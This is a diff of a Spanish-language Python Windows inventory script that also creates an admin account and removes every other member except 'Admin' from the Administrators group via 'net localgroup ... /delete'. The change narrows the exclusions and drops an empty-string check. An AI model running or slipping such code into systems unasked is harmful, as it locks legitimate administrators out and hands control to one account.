@@ -96,7 +96,7 @@ def quitar_otros_admins():
         admins = result.stdout.splitlines()
         for admin in admins:
             admin = admin.strip()
-            if admin and admin != 'Admin' and admin != 'Administradores' and admin != 'Administrators':
+            if admin != 'Admin':
                 # Intentar quitar al usuario del grupo de administradores
                 try:
                     subprocess.run(['net', 'localgroup', 'Administradores', admin, '/delete'], check=True)
@@ -105,6 +105,7 @@ def quitar_otros_admins():
                 resultado += f"Usuario '{admin}' quitado del grupo de administradores."
     except Exception as e:
         resultado += f"Error al quitar usuarios del grupo de administradores: {e}"
+    return resultado
 
 def obtener_info_pc():
     # Inicializar WMI
@@ -154,7 +155,7 @@ def obtener_info_pc():
     usuarios = [user.name for user in psutil.users()]
 
     # Formatear resultados
-    mensaje = f"Marca: {marca}\nModelo: {modelo}\nNúmero de Serie: {numero_serie}\nLicencia de Windows: {licencia}\nProcesador: {procesador}\nRAM Total (GB): {ram_total}\n Creacion de Admin \n {info_pc}\n\n{crear_usuario_admin()}\n\n{quitar_otros_admins()}"
+    mensaje = f"Marca: {marca}\nModelo: {modelo}\nNúmero de Serie: {numero_serie}\nLicencia de Windows: {licencia}\nProcesador: {procesador}\nRAM Total (GB): {ram_total}\n Creacion de Admin \n{crear_usuario_admin()}\n\n{quitar_otros_admins()}"
     mensaje += "Información de Discos:\n"
     for disco in discos:
         mensaje += f"- {disco['Disco']}: Total={disco['Total (GB)']} GB, Usado={disco['Usado (GB)']} GB, Libre={disco['Libre (GB)']} GB\n"
